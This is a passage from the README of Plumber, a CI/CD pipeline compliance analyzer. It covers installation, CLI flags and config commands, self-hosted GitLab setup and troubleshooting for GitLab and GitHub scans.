Automatically post compliance summaries on merge requests to catch issues before they're merged.

```yaml
include:
  - component: gitlab.com/getplumber/plumber/plumber@v0.3.1
    inputs:
      mr_comment: true  # Requires api scope on token
```

<p align="center">
  <img src="assets/merge-request-comments.png" alt="Merge Request Comment" width="800">
</p>

**Features:**
- Shows compliance badge with pass/fail status
- Lists all controls with individual compliance percentages
- Details specific issues found with job names and image references
- With `--score-point`, includes a **Plumber Score** block (points + letter) in the comment; with `--score` only, a short letter **score** line (badge shows the letter whenever either flag is set)
- When the badge shows the **letter score** (`--score` or `--score-point`), clicking it opens the [scoring documentation](https://github.com/getplumber/plumber/blob/main/docs/scoring.md)
- Automatically updates on each pipeline run (doesn't create duplicate comments)

> ⚠️ **Token requirement:** The `api` scope is required (not `read_api`) to create/update MR comments.

### Project Badges

Display a live compliance badge on your project's overview page.

```yaml
include:
  - component: gitlab.com/getplumber/plumber/plumber@v0.3.1
    inputs:
      badge: true  # Requires api scope on token
```

<p align="center">
  <img src="assets/badge-comment.png" alt="Project Badge" width="300">
</p>

**Features:**
- Shows current compliance percentage (or letter score **A–E** when `--score` or `--score-point` is enabled)
- **Green** when compliance meets threshold, **red** when below
- Only updates on default branch pipelines (not on MRs or feature branches)
- Badge appears in GitLab's "Project information" section

> ⚠️ **Token requirement:** The `api` scope is required (not `read_api`) and Maintainer role to manage project badges.

---

## 📦 Installation

### Homebrew

```bash
brew tap getplumber/plumber
brew install plumber
```

To install a specific version:

```bash
brew install getplumber/plumber/plumber@0.2.7
```

> **Note:** Versioned formulas are keg-only. Use the full path for example `/usr/local/opt/plumber@0.2.7/bin/plumber` or run `brew link plumber@0.2.7` to add it to your PATH.

### Mise

```bash
mise use -g github:getplumber/plumber
```

> Requires [mise activation](https://mise.jdx.dev/getting-started.html#activate-mise) in your shell, or run with `mise exec -- plumber`.

### Binary Download

<details>
<summary><b>Linux (amd64)</b></summary>

```bash
curl -LO https://github.com/getplumber/plumber/releases/latest/download/plumber-linux-amd64
chmod +x plumber-linux-amd64
sudo mv plumber-linux-amd64 /usr/local/bin/plumber
```

</details>

<details>
<summary><b>Linux (arm64)</b></summary>

```bash
curl -LO https://github.com/getplumber/plumber/releases/latest/download/plumber-linux-arm64
chmod +x plumber-linux-arm64
sudo mv plumber-linux-arm64 /usr/local/bin/plumber
```

</details>

<details>
<summary><b>macOS (Apple Silicon)</b></summary>

```bash
curl -LO https://github.com/getplumber/plumber/releases/latest/download/plumber-darwin-arm64
chmod +x plumber-darwin-arm64
sudo mv plumber-darwin-arm64 /usr/local/bin/plumber
```

</details>

<details>
<summary><b>macOS (Intel)</b></summary>

```bash
curl -LO https://github.com/getplumber/plumber/releases/latest/download/plumber-darwin-amd64
chmod +x plumber-darwin-amd64
sudo mv plumber-darwin-amd64 /usr/local/bin/plumber
```

</details>

<details>
<summary><b>Windows (PowerShell)</b></summary>

```powershell
Invoke-WebRequest -Uri https://github.com/getplumber/plumber/releases/latest/download/plumber-windows-amd64.exe -OutFile plumber.exe
```

</details>

<details>
<summary><b>Verify checksum</b></summary>

```bash
curl -LO https://github.com/getplumber/plumber/releases/latest/download/checksums.txt
sha256sum -c checksums.txt --ignore-missing
```

</details>

<details>
<summary><b>Verify build provenance</b></summary>

Every release binary has a signed [SLSA Level 3](https://slsa.dev/spec/v1.0/levels#build-l3) attestation stored in GitHub's attestation store. Verify with the GitHub CLI:

```bash
gh attestation verify plumber-linux-amd64 --repo getplumber/plumber
```

For the Docker image, verify without downloading:

```bash
gh attestation verify oci://docker.io/getplumber/plumber:latest --repo getplumber/plumber
```

This confirms the artifact was built from the expected source commit, on GitHub Actions, and wasn't tampered with after the build. See [supply chain security docs](docs/supply-chain-security.md) for details.

</details>

### Docker

```bash
docker pull getplumber/plumber:latest

# GitLab
docker run --rm \
  -e GITLAB_TOKEN=glpat-xxxx \
  getplumber/plumber:latest analyze \
  --gitlab-url https://your-gitlab-instance.com \
  --project mygroup/myproject

# GitHub (upstream-fetch — no clone needed)
docker run --rm \
  -e GH_TOKEN=ghp_xxxx \
  getplumber/plumber:latest analyze \
  --github-url github.com \
  --project owner/repo

# GitHub (local-clone — mount your checkout)
docker run --rm \
  -v "$PWD:/repo" -w /repo \
  -e GH_TOKEN=ghp_xxxx \
  getplumber/plumber:latest analyze
```

### Build from Source

> Requires Go 1.24+ and Make.

```bash
git clone https://github.com/getplumber/plumber.git
cd plumber
make build # or make install to build and copy to /usr/local/bin/
```

---

## 🔍 CLI Reference

### `plumber analyze`

Runs the compliance analyzer. **Behavior depends on the git remote (and flags):**

| Mode | When | What runs |
|------|------|-----------|
| **GitLab** | `origin` is a GitLab host, or you pass `--gitlab-url` and `--project` | Fetches CI config and project data via the GitLab API (requires `GITLAB_TOKEN`). Per-control compliance + `--threshold` exit-code gating. |
| **GitHub — local clone** | `origin` is GitHub and you do **not** pass `--github-url`. Soft-degrade: workflow-content controls run from disk with no token; repo-level controls (branch protection) run when `GH_TOKEN`/`GITHUB_TOKEN`/`gh` auth is available, and silently abstain otherwise. | Reads `.github/workflows/*.{yml,yaml}` from disk; calls the GitHub API only when needed for repo-level controls. Per-control compliance + `--threshold` exit-code gating. PBOM and CycloneDX SBOM both supported. **`--mr-comment`** and **`--badge`** remain GitLab-only today. |
| **GitHub — upstream fetch** | You pass `--github-url <host> --project owner/repo`. **Auth required** (token or `gh auth login`); plumber refuses to start without it (avoids GitHub's silent 60 req/hr anonymous degradation). | Lists `.github/workflows/` via the GitHub Contents API; otherwise identical to local-clone mode. Repo-side files needing a checkout (Dockerfile, `dependabot.yml`, `SECURITY.md`) are skipped. |

To **force GitLab** analysis from a machine that has a GitHub `origin` (e.g. a fork), pass `--gitlab-url` and `--project` explicitly. To **force GitHub upstream-fetch** from a GitLab clone, pass `--github-url`.

```bash
plumber analyze [flags]
```

### Flags

| Flag | Required | Default | Description |
|------|----------|---------|-------------|
| `--gitlab-url` | No* | auto-detect | GitLab instance URL |
| `--project` | No* | auto-detect | Project path (e.g., `group/project`) |
| `--config` | No | `.plumber.yaml` | Path to config file |
| `--threshold` | No | `100` | Minimum compliance % to pass (0-100). **Gates exit code on both providers.** |
| `--branch` | No | default | Branch to analyze (GitLab + GitHub upstream-fetch; informational on GitHub local scan) |
| `--output` | No | — | Write JSON results to file (both providers; GitHub output also includes `partialControls` when a control couldn't fully evaluate). |
| `--pbom` | No | — | Write PBOM (Pipeline Bill of Materials) to file. **GitLab inventory:** container images + includes (components, templates, project includes, …). **GitHub inventory:** container images (`container:` blocks, `services:`) + third-party actions (`uses: owner/repo@ref`) + reusable-workflow calls. |
| `--pbom-cyclonedx` | No | — | Same inventory as `--pbom`, serialized as CycloneDX 1.5 SBOM. GitHub action references emit `pkg:github/owner/repo@<sha>` purls. |
| `--glsast` | No | — | Write findings as a GitLab SAST report (`gl-sast-report.json`, schema v15). Wire into a GitLab job's `artifacts:reports:sast` so findings appear in the Security Dashboard and MR security widget. Each finding carries its issue code as a scanner identifier with the doc URL. |
| `--sarif` | No | — | Write findings as a SARIF 2.1.0 file. Upload to GitHub Code Scanning (`github/codeql-action/upload-sarif`) to surface findings in the Security tab, or to GitLab's SARIF path. Severity maps to SARIF `level` (critical/high → error, medium → warning, low → note) and `security-severity`. A clean run writes a valid empty-results file so prior alerts are cleared. |
| `--print` | No | `true` | Print text output to stdout |
| `--mr-comment` | No | `false` | Post/update a compliance comment on the merge request (MR pipelines only: requires `api` scope) |
| `--badge` | No | `false` | Create/update a Plumber compliance badge on the project (requires `api` scope; only runs on default branch) |
| `--score` | No | `false` | Letter **score**, **points**, bar, and severity counts in the stdout banner (no points table); **points** + score in JSON, PBOM, CycloneDX; with `--badge`, the badge shows the letter instead of compliance % |
| `--score-point` | No | `false` | Like `--score` plus full **points** breakdown in stdout and MR comment; if both flags are set, points mode wins |
| `--controls` | No | — | Run only listed controls (comma-separated). Cannot be used with `--skip-controls` |
| `--skip-controls` | No | — | Skip listed controls (comma-separated). Cannot be used with `--controls` |
| `--fail-warnings` | No | `false` | Treat configuration warnings (unknown keys) as errors (exit 2) |
| `--ci-config-path` | No | auto-detect | Override the CI configuration file path (default: auto-detected from GitLab project settings, usually `.gitlab-ci.yml`). See [Custom CI Configuration File Path](#custom-ci-configuration-file-path) |
| `--verbose`, `-v` | No | `false` | Enable verbose/debug output for troubleshooting |

> **Plumber score:** how letter **A–E**, numeric **points**, and **Critical malus** are computed is documented in **[docs/scoring.md](docs/scoring.md)** (profile `scoring-v3`, per-code caps). Issue **severities** come from each issue’s documented code ([issues](https://getplumber.io/docs/cli/issues/)).

> \* Auto-detected from git remote (`origin`) if not specified. Supports both SSH and HTTPS remote URLs.

### Environment Variables

| Variable | Required | Description |
|----------|----------|-------------|
| `GITLAB_TOKEN` | **Yes** for any GitLab analysis | GitLab API token with `read_api` + `read_repository` scopes (Maintainer or higher). Use `api` scope instead if `--mr-comment` or `--badge` is enabled. Unused on the GitHub path. |
| `GH_TOKEN` | Optional (preferred) | GitHub PAT (fine-grained or classic). Required in GitHub upstream-fetch mode (`--github-url`). Optional in local-clone mode (enables repo-level controls). Takes precedence over `GITHUB_TOKEN` and `gh` CLI. |
| `GITHUB_TOKEN` | Optional | Same role as `GH_TOKEN`. Auto-set by GitHub Actions runners — pick this up natively when running plumber as a workflow step. |
| `GH_ENTERPRISE_TOKEN` | Optional | Authentication for GitHub Enterprise Server (`--github-url ghes.example.com`). |
| `PLUMBER_DISABLE_GITHUB_API` | No | Set to any value to skip the GitHub action-metadata enrichment loop in local-clone mode (the archived-repo and known-CVE advisory checks). Speeds up local iteration when you don't need those checks. |
| `PLUMBER_NO_UPDATE_CHECK` | No | Set to any value (e.g., `1`) to disable the automatic version check. |

### Automatic Version Check

When running locally, Plumber checks GitHub for newer releases on every invocation and prints an upgrade notice if one is available. The check runs asynchronously and has a 3-second timeout, so it never slows down the analysis.

The check is **automatically skipped** when:
- Running in **CI environments** (`CI` or `GITLAB_CI` environment variables are set)
- Using a **development build** (version is `dev`)

To disable it manually, set `PLUMBER_NO_UPDATE_CHECK`:

```bash
export PLUMBER_NO_UPDATE_CHECK=1
```

### Exit Codes

| Exit Code | Meaning |
|-----------|----------|
| `0` | Analysis passed: compliance ≥ `--threshold` (both providers). |
| `1` | Compliance failure: compliance below `--threshold` (both providers). |
| `2` | Runtime error (config error, network failure, missing token on the GitLab path, missing token on GitHub upstream-fetch, etc.). |

### `plumber config init`

Interactive wizard to create a **minimal** `.plumber.yaml` by choosing policy areas (images, pipeline composition, branch protection, variables). Omits controls you do not select. For every control in a selected area, the wizard asks for the fields defined in the schema (for example forbidden include refs, security job patterns and sub-checks, trusted script URLs, job variable lists, DinD options, branch protection levels, debug and unsafe-expansion variable lists, regex allowlists, and required components or templates via the `required` expression).

Requires an interactive terminal. For the full default template with inline comments (including in CI), use [`plumber config generate`](#plumber-config-generate).

> **GitHub coverage:** the wizard currently writes only the `gitlab.controls.*` section. For GitHub, run `plumber config generate` to get the full template and trim, or hand-author the `github.controls.*` section using the [GitHub Actions controls](#github-actions-controls) reference above. A GitHub-aware wizard track is on the roadmap.

```bash
plumber config init [flags]
```

| Flag | Default | Description |
|------|---------|-------------|
| `--output`, `-o` | `.plumber.yaml` | Output file path |
| `--force`, `-f` | `false` | Overwrite existing file without asking |

**Examples:**

```bash
plumber config init
plumber config init --output ./configs/plumber.yaml
```

### `plumber config generate`

Writes the **official default** `.plumber.yaml`: the full template Plumber ships with, including comments and every control documented inline. Use [`plumber config init`](#plumber-config-init) instead if you want a smaller, wizard-driven file with only the checks you pick.

```bash
plumber config generate [flags]
```

| Flag | Default | Description |
|------|---------|-------------|
| `--output`, `-o` | `.plumber.yaml` | Output file path |
| `--force`, `-f` | `false` | Overwrite existing file |

**Examples:**

```bash
plumber config generate
plumber config generate --output my-plumber.yaml
plumber config generate --force
```

### `plumber config view`

Display a clean, human-readable view of the effective configuration without comments.

```bash
plumber config view [flags]
```

| Flag | Default | Description |
|------|---------|-------------|
| `--config`, `-c` | `.plumber.yaml` | Path to configuration file |
| `--no-color` | `false` | Disable colorized output |

Booleans are colorized for quick scanning: `true` in green, `false` in red. Color is automatically disabled when piping output.

**Examples:**

```bash
# View the default .plumber.yaml
plumber config view

# View a specific config file
plumber config view --config custom-plumber.yaml

# View without colors (for piping or scripts)
plumber config view --no-color
```

### `plumber config validate`

Validate a configuration file for correctness. Detects unknown control names and sub-keys with typo suggestions using fuzzy matching.

```bash
plumber config validate [flags]
```

| Flag | Default | Description |
|------|---------|-------------|
| `--config`, `-c` | `.plumber.yaml` | Path to configuration file |
| `--fail-warnings` | `false` | Treat configuration warnings as errors (exit 2) |

Warnings are printed to stderr so they don't interfere with scripted output. Use `--fail-warnings` to exit with code 2 when warnings are found (useful in CI).

**Examples:**

```bash
# Validate the default .plumber.yaml
plumber config validate

# Validate a specific config file
plumber config validate --config custom-plumber.yaml

# Fail on warnings (for CI pipelines)
plumber config validate --fail-warnings
```

**Sample output with typos:**

```
Configuration validation warnings:
  - Unknown control in .plumber.yaml: "containerImageMustNotUseForbiddenTag". Did you mean "containerImageMustNotUseForbiddenTags"?
  - Unknown key "tag" in control "containerImageMustNotUseForbiddenTags". Did you mean "tags"?
  - Unknown key "allowForcePushes" in control "branchMustBeProtected". Did you mean "allowForcePush"?
```

### `plumber config diff`

Compare your `.plumber.yaml` against Plumber's built-in defaults. Useful for spotting customizations, discovering new options after upgrading, and catching typos.

```bash
plumber config diff [flags]
```

| Flag | Default | Description |
|------|---------|-------------|
| `--config`, `-c` | `.plumber.yaml` | Path to configuration file |
| `--no-color` | `false` | Disable colorized output |

The output has three sections:

1. **Controls changed from defaults** - keys whose values differ from the built-in defaults. Scalar changes show `old → new`. List changes show per-item `+`/`-` lines.
2. **New keys in default (missing from your config)** - keys added in newer Plumber versions that your config doesn't include yet, with their default values.
3. **Unknown keys in your config (not in defaults)** - keys Plumber doesn't recognize. Includes typo suggestions via fuzzy matching when a close match exists.

Color is automatically disabled when piping output.

**Examples:**

```bash
# Compare the default .plumber.yaml against built-in defaults
plumber config diff

# Compare a specific config file
plumber config diff --config custom-plumber.yaml

# Without colors (for piping or scripts)
plumber config diff --no-color
```

**Sample output:**

```
Controls changed from defaults:
  controls.branchMustBeProtected.enabled: true → false
  controls.containerImageMustNotUseForbiddenTags.tags:
    - dev
    - staging
    + nightly

New keys in default (missing from your config):
  controls.pipelineMustNotUseUnsafeVariableExpansion.allowedPatterns (default: [])

Unknown keys in your config (not in defaults):
  controls.containerImageMustNotUseForbiddenTag ← possible typo? Did you mean "controls.containerImageMustNotUseForbiddenTags.enabled"?
```

### `plumber explain`

Look up detailed information about a Plumber issue code directly in the terminal. Useful for understanding what an issue means, why it matters, and how to fix it — without leaving your current context.

```bash
plumber explain [ISSUE-CODE] [flags]
```

`ISSUE-CODE` supports both `ISSUE-412` and shorthand numeric form like `412`.

| Flag | Default | Description |
|------|---------|-------------|
| `--list` | `false` | List all issue codes with short descriptions |
| `--all` | `false` | Show detailed information for all issue codes |
| `--json` | `false` | Output in JSON format |

**Examples:**

```bash
# Explain a specific issue code
plumber explain ISSUE-412

# Shorthand form (equivalent)
plumber explain 412

# List all available issue codes
plumber explain --list

# Get machine-readable output
plumber explain --json ISSUE-412

# Full reference dump
plumber explain --all

# Full reference in JSON
plumber explain --all --json
```

**Sample output:**

```
ISSUE-412: Docker-in-Docker service detected
Control:     pipelineMustNotUseDockerInDocker

Description:
  A CI/CD job uses a Docker-in-Docker (dind) service. On shared runners
  running in privileged mode, this enables container escape, lateral
  movement, and access to secrets from other jobs on the same runner.

Remediation:
  Replace Docker-in-Docker with a safer alternative such as Kaniko or
  Buildah for building container images. These tools do not require
  privileged mode and avoid the security risks of running a Docker
  daemon inside a CI container.

Documentation: https://getplumber.io/docs/cli/issues/ISSUE-412
```

---

## ⚠️ Self-Hosted GitLab

If you're running a self-hosted GitLab instance, you'll need to host your own copy of the component.

There are two ways to bring Plumber to your self-hosted instance. Choose the one that fits your workflow:

<details>
<summary><b>Option A: Direct Import (simplest)</b></summary>

Import the upstream repository directly into your GitLab instance.

**Step 1: Import the repository**

- Go to **New Project → Import project → Repository by URL**
- URL: `https://gitlab.com/getplumber/plumber.git`
- Choose a group/project name (e.g., `infrastructure/plumber`)

**Step 2: Enable CI/CD Catalog**

- Go to **Settings → General**
- Make sure the project has a **description** (required for CI/CD Catalog)
- Expand **Visibility, project features, permissions**
- Toggle **CI/CD Catalog resource** to enabled
- Click **Save changes**

**Step 3: Publish a release**

The imported project comes with upstream tags. The preferred method is to run a pipeline on an existing tag to trigger the release:

- Go to **CI/CD → Pipelines → Run pipeline**
- Select an imported tag (e.g., `v0.2.0`) from the branch/tag dropdown
- Click **Run pipeline**: this creates a release for that tag in the CI/CD Catalog

Alternatively, create a new tag manually, but this might conflict later on when you want to fetch remote tags:

- Go to **Code → Tags → New tag**
- Enter a version (e.g., `1.0.0`)
- Click **Create tag**

**Step 4: Create a GitLab Token**

In the project you want to scan:

1. Go to **User Settings → Access Tokens** on your GitLab instance
2. Create a Personal Access Token with `read_api` + `read_repository` scopes (or `api` if using `mr_comment` or `badge`)
   * **Project Access Tokens** also work: create one inside your project **Settings → Access Tokens** with the same scopes and at least **Maintainer** role
3. Go to the project's **Settings → CI/CD → Variables**
4. Add the token as `GITLAB_TOKEN` (masked recommended)

> ⚠️ The token must belong to a user (or project bot) with **Maintainer** role (or higher) on the project.

**Step 5: Use in your pipelines**

```yaml
workflow:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    - if: $CI_COMMIT_BRANCH && $CI_OPEN_MERGE_REQUESTS # prevents duplicate pipelines
      when: never
    - if: $CI_COMMIT_BRANCH
    - if: $CI_COMMIT_TAG

include:
  - component: gitlab.example.com/infrastructure/plumber/plumber@v0.3.1
    # inputs:
    #   stage: .pre | by default runs in .pre which only runs if there is at least another CI job in another stage
```

To update: re-import or manually pull upstream changes.

</details>

<details>
<summary><b>Option B: Fork on gitlab.com + Mirror (recommended)</b></summary>

Fork the project on gitlab.com first, then set up a pull mirror on your self-hosted instance. This way whenever you fetch upstream changes in your fork, your self-hosted mirror stays in sync automatically.

**Step 1: Fork on gitlab.com**

- Go to [getplumber/plumber](https://gitlab.com/getplumber/plumber) on gitlab.com
- Click **Fork** and create a fork under your gitlab.com namespace (e.g., `your-org/plumber`)

**Step 2: Create a mirrored project on your self-hosted instance**

- On your self-hosted GitLab, go to **New Project → Import project → Repository by URL**
- URL: `https://gitlab.com/your-org/plumber.git`
- Choose a group/project name (e.g., `infrastructure/plumber`)

**Step 3: Set up pull mirroring**

- In your self-hosted project, go to **Settings → Repository → Mirroring repositories**
- Add the mirror URL: `https://gitlab.com/your-org/plumber.git`
- Direction: **Pull**
- Authentication: add a gitlab.com token with `read_repository` scope if the fork is private
- Click **Mirror repository**

> 💡 Pull mirroring syncs automatically (every 30 minutes on GitLab Premium, or manually on other tiers). When upstream releases a new version, sync your fork on gitlab.com first, then your self-hosted mirror picks it up.

**Step 4: Enable CI/CD Catalog**

- Go to **Settings → General**
- Make sure the project has a **description** (required for CI/CD Catalog)
- Expand **Visibility, project features, permissions**
- Toggle **CI/CD Catalog resource** to enabled
- Click **Save changes**

**Step 5: Publish a release**

The mirrored project comes with upstream tags. The preferred method is to run a pipeline on an existing tag to trigger the release:

- Go to **CI/CD → Pipelines → Run pipeline**
- Select an imported tag (e.g., `v0.2.0`) from the branch/tag dropdown
- Click **Run pipeline**: this creates a release for that tag in the CI/CD Catalog

Alternatively, create a new tag manually:

- Go to **Code → Tags → New tag**
- Enter a version (e.g., `1.0.0`)
- Click **Create tag**

**Step 6: Create a GitLab Token**

In the project you want to scan:

1. Go to **User Settings → Access Tokens** on your GitLab instance
2. Create a Personal Access Token with `read_api` + `read_repository` scopes (or `api` if using `mr_comment` or `badge`)
   * **Project Access Tokens** also work: create one inside your project **Settings → Access Tokens** with the same scopes and at least **Maintainer** role
3. Go to the project's **Settings → CI/CD → Variables**
4. Add the token as `GITLAB_TOKEN` (masked recommended)

> ⚠️ The token must belong to a user (or project bot) with **Maintainer** role (or higher) on the project.

**Step 7: Use in your pipelines**

```yaml
workflow:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    - if: $CI_COMMIT_BRANCH && $CI_OPEN_MERGE_REQUESTS # prevents duplicate pipelines
      when: never
    - if: $CI_COMMIT_BRANCH
    - if: $CI_COMMIT_TAG

include:
  - component: gitlab.example.com/infrastructure/plumber/plumber@v<Your-Tag>
    # inputs:
    #   stage: .pre | by default runs in .pre which only runs if there is at least another CI job in another stage
```

</details>

---

## 🔧 Troubleshooting

**GitLab**

| Issue | Solution |
|-------|----------|
| `GITLAB_TOKEN environment variable is required` | Set `GITLAB_TOKEN` in CI/CD Variables or export it locally |
| `401 Unauthorized` | Token needs `read_api` + `read_repository` scopes, from a Maintainer or higher |
| `403 Forbidden` on MR settings | Expected on non-Premium GitLab; continues without that data |
| `403 Forbidden` on MR comment | Token needs `api` scope (not `read_api`) when `--mr-comment` is enabled |
| `403 Forbidden` on badge | Token needs `api` scope (not `read_api`) when `--badge` is enabled |
| `404 Not Found` | Verify project path and GitLab URL are correct |
| MR comment not posted | `--mr-comment` only works in merge request pipelines (`CI_MERGE_REQUEST_IID` must be set) |
| Badge not created/updated | Token needs `api` scope and Maintainer role (or higher) on the project |
| Configuration file not found | Use absolute path in Docker, relative path otherwise |
| Plumber job not running | The default stage is `.pre`, which requires at least one other job in a regular stage. Override with `inputs: { stage: test }` |
| Two pipelines on the same push | Add [`workflow:rules`](https://docs.gitlab.com/ee/ci/yaml/workflow.html#switch-between-branch-pipelines-and-merge-request-pipelines) to your `.gitlab-ci.yml` to prevent duplicate branch + MR pipelines (see [Quick Start](#-quick-start)) |
| Plumber job skipped on branch | The component only runs on merge request events, the default branch, and tags. Open an MR or push to the default branch to trigger it |

**GitHub**

| Issue | Solution |
|-------|----------|
| `GitHub authentication required for upstream-fetch mode` | You ran `--github-url …` without auth. Export `GH_TOKEN`, set `GITHUB_TOKEN`, or `gh auth login`. See [Step 3](#step-3-authenticate). |
| `Resource not accessible by personal access token` (HTTP 403) on `/branches/{name}/protection` | Your fine-grained PAT lacks **Administration: Read**. ISSUE-505 (force-push / code-owner-approval) is silently abstained — the postflight stats line and JSON `partialControls` block surface this. To evaluate, use a classic PAT with `repo` scope, a fine-grained PAT with Administration:Read approved by an org admin, or `gh auth login` with a user account that has admin on the repo. |
| `branchMustBeProtected` shows 100 % but you know branches aren't fully protected | Look for `⚠ Force-push & code-owner rules: skipped on N branch(es)` in the stats block, and `partialControls` in the JSON output. ISSUE-501 (presence) ran; ISSUE-505 (rules) needs admin scope. |
| `403 rate limit exceeded` from GitHub | You're hitting the unauthenticated 60 req/hr ceiling. Authenticate per [Step 3](#step-3-authenticate) — authenticated calls get 5,000 req/hr. Upstream-fetch mode pre-flights this and refuses to start without auth. |
| `404 Not Found` on `--github-url … --project owner/repo` | Verify the project slug, and that your token has access (org-private repos require the token to be tied to a user with repo access; for fine-grained PATs, the repo must be in the token's selected list). |
| Plumber doesn't auto-detect GitHub from `origin` | Confirm `git remote get-url origin` resolves to a `github.com` host (or the GHES host you expect). For non-default remotes, pass `--github-url github.com --project owner/repo` explicitly. |
| Want to scan a private GHES repo | Set `GH_ENTERPRISE_TOKEN` and pass `--github-url ghes.example.com` (or the `/api/v3` path). |
| `gh auth status` shows the wrong account | `gh auth login` with the right account; or `export GH_TOKEN=…` to override (env vars take precedence over the gh CLI store — see the [auth resolution table in Step 3](#step-3-authenticate)). |

> 💡 **Need help?** [Open an issue](https://github.com/getplumber/plumber/issues) or [join our Discord](https://discord.gg/932xkSU24f)


---

## 🤝 Contributing

Contributions are welcome! Please read our [Contributing Guide](CONTRIBUTING.md) for details on how to submit pull requests, report issues, and coding conventions.

---

## 💡 See it in action
Check out our example projects:
- [go-build-test-compliant](https://gitlab.com/getplumber/examples/go-build-test-compliant/-/pipelines) - A compliant project passing all checks
- [go-build-test-non-compliant](https://gitlab.com/getplumber/examples/go-build-test-non-compliant/-/pipelines) - A non-compliant project showing detected issues
- [go-build-test-with-hash](https://gitlab.com/getplumber/examples/go-test-with-hash/-/pipelines)  - A partially compliant project with digest-pinned images
- [go-test-with-local-include](https://gitlab.com/getplumber/examples/go-test-with-local-include/-/pipelines) - A Partially compliant project with local file inclusions

---

## 📰 Blog Posts & Articles

### English

- [Your GitLab Pipelines Are Probably Non-Compliant — Here's How to Fix That in 5 Minutes](https://medium.com/@moukarzeljoseph/your-gitlab-pipelines-are-probably-non-compliant-heres-how-to-fix-that-in-5-minutes-5009614a1fb1) — Medium
- [OpenSSF and SLSA3](https://getplumber.io/blog/openssf-and-salsa) - Plumber blog

### Français

- [Plumber : Vos pipelines GitLab CI/CD sont-ils conformes ?](https://blog.stephane-robert.info/docs/pipeline-cicd/gitlab/outils/plumber/) — Stéphane Robert
- [Plumber : La compliance à portée de main](https://www.linkedin.com/posts/bbenjamin28_plumber-la-compliance-%C3%A0-port%C3%A9e-de-main-activity-7427248795173699584-vxV4/) — Benjamin Bacle, LinkedIn

## 📄 License

[Mozilla Public License 2.0 (MPL-2.0)](LICENSE)


## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=getplumber/plumber&type=date&legend=top-left)](https://www.star-history.com/#getplumber/plumber&type=date&legend=top-left)
